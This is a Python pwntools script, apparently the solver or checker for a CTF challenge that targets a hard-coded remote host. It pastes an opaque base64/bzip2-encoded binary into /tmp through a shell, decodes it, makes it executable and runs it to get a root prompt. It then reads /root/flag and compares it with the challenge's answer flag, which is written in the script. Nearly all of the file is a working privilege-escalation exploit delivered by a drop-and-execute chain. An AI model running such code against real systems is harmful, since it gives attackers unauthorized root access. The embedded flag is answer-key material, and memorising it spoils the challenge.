#!/usr/bin/env python2

from pwn import *
import sys

HOST  = '34.246.96.248'
PORT  = 13579
FLAG  = 'midnight{1_Kn3W_tH@t_w4S_a_BaD_1de4}'
DEBUG = False
FAIL  = False

host = HOST
if len(sys.argv) > 1:
	host = sys.argv[1]

port = PORT
if len(sys.argv) > 2:
	port = sys.argv[2]

if len(sys.argv) > 3:
	DEBUG = True

io = remote(host, port)

io.recvuntil("$ ")
io.sendline("cd /tmp")

io.recvuntil("$ ")
io.sendline("echo 'QlpoOTFBWSZTWZT1jHAAA8d//////v39///8+/9+ev/v//PsSgx2wHQlF37QacL+/KWV0ASeUN62unG"+
	"lsDgxFT0KemmhGjI00NPUGg0GRoDTIAAAADQNDQAAAAAD1NAD0gNAAAA1MjSmJ5E00aRHtSepmpiT0nqbUyYRtNEMm1G1"+
	"NAzU08pghgmIybUaYaRiMTT1DR6QaB6jajQxBogyYjJpk0GhkxDIA00BhGCNNMEGExDEaNAGgGEYE0DTTQZAGQ0yaAGmQ"+
	"NMoQU9UHoQaAAABpo0AAANAHqGgBoAAAD1BoAAAAAGh5T1AAxRMkTU2pp6EwmmmEHpPKBoYgDTRoZGg0AaBoAGIGIBpoA"+
	"AAAGg0GgHqWb4YC5EhABPewENUISWT3jBBa5bf+nPZHERKOPNKbnLZ8au0FZYOE8SChQUMeogs3kgSKmoxE9S3cJq4Jps"+
	"pAFsRg8c5NNAQGfmewinUlsamXySJ0Utn6oHIQ3LCnTLoMXSfHcyDFi1ERsJBmrUpnEM72/6nXhm+h8SRWR6UAgCcRICQ"+
	"n0GIkxJTCLlChcwGZgsEtCKg4L5LCfA0xFCi1AJzCRqbKt2kqDbVu9VtO3sYk3ik1U5XMkVTyMZsIjwgoCAconIRUc4Ta"+
	"BIotaACkKQIOWacTXhoD0KRFit1qECYqAjpgScgGANIBUWqtWqSBCGVyYRCxDy0HumQTwI+UZrgLlR5/7Bj2mZnCkN25p"+
	"xhVJJOLOBxllU1tXVHmW+S2noxTGOfAyws5ICKzgW1bNK4JC2ouEfytmBdraGg2eqf6luex2fczch9IicHEdljGJBK+To"+
	"DA1BAJjCkZctgJAcEHIwgB4QZVp7ySnh7Jx3ztnB7NBEIEJkkECxCo05XPCsX365vJeBRIECxneJcXWYfhWkRoEgAJeZh"+
	"wE0EKfRIeEOIBB9QAeLQnGUL38s8HuwPlkLD5JJQAWCMGL4lQJ3sxmbqpFqxBWkYXwgHouMCHM0FGShPKMSi'>>ex.b64")

io.recvuntil("$ ")
io.sendline("echo 'gOcgJ9YPzZlbVMAF9RMpEaRERbIMEIQp4JWseIb6Fj2ApEJZ/81bSQ6Kw0yEaTGfapBfkr2+YeunP1w"+
	"Uqiod142BSMMUwoBxphtaQRmEVZewnyYfhlc+odkgZKDSgLoroynyRCKCRJSRwQZEaTUUj7yhXIKNIB0o3fJ4mP6Og+pS"+
	"egJRV8Z9UrlWRpFwMxCWoTEKRyrnM1L9JIhRsngrWBADs0HrEgAYrAdmBpoDFqjnccGVmMcI8DoSNnCbDKBwQKUQ1JVBP"+
	"mHKLpMfcYWDpFpbPOw+kg1FMxd/iVi+zJtLeQDHnEP0XEQvKYS2nTwYrPbkwIY/f+niVRM482LUY3qWwGgrJW1itdHUfI"+
	"9vyhL1RTdkMeSilVR1wU4NzoQHIhiAgXCBWJ9EeTmc0oR/C4xACnnC7Oir04Bpt4Ght5YINElwNi4QSxX17zGNVen3hCm"+
	"jmC7qctabSNZUhtsuWNIZiqRtrksU4lxPi/NlITv8uuc8Zc4l1TsQ2IAijR13A7niKQISSVVivWbDuCS4fRoHkzw0bM2v"+
	"GJm1TrbCtFrSGTPPPILMwpOBSCmIcHVHnE4EqgTRrY4TMRhWlSAxHZNkkBXTRKHRIGWASq+t2vkbrrbbq8nd4uskkwBoa"+
	"lyLVorqdtCUUIgYChXbZfqfZjp3yr0P3jBatQvXUrMIiMpVGHxqxEalunPKKr4hC54YSClcHNWBKalicaxihnvxEVjf3e"+
	"/0wxiqOgTZZxxCUIZdPdEyMCEii0hpFnAmIpmsE6hGoSbJBxjq2YSRB5SKvVe9mjIDsdQzzeSHhyK1kszhPMk2i2L2iz5"+
	"nTo4NkiLA15EJkIFrqR9NPQqX0gK0EtaFfUokgsCxM+j8zFRJW6IlKlUjML2WcWErlEKZ/PyA+0fuqHrvoOApkp5caZCN"+
	"R2phXFmtOk1iBZYCAJAJYklkgQKmok/oQBtk/+B8LTfi5RAukGkzJnuTJn+mU1PI/4u5IpwoSEp6xjgA'>>ex.b64")

io.recvuntil("$ ")
io.sendline("cat ex.b64 | base64 -d | bzip2 -d > ./ex; chmod +x ./ex; ./ex")

io.recvuntil("# ")

if DEBUG == True:
	log.success('got shell?')
	io.sendline('id')
	io.recvline()
	io.info(io.recvline().strip())

	io.interactive()

else:

	io.sendline('cat /root/flag')
	io.recvline()

	if io.recvline().strip() != FLAG:
		log.failure('fail')

	else:
		log.success('pass')

	io.sendline('exit')
	io.sendline('exit')

if FAIL == True:
	sys.exit(-1)
else:
	sys.exit(0)
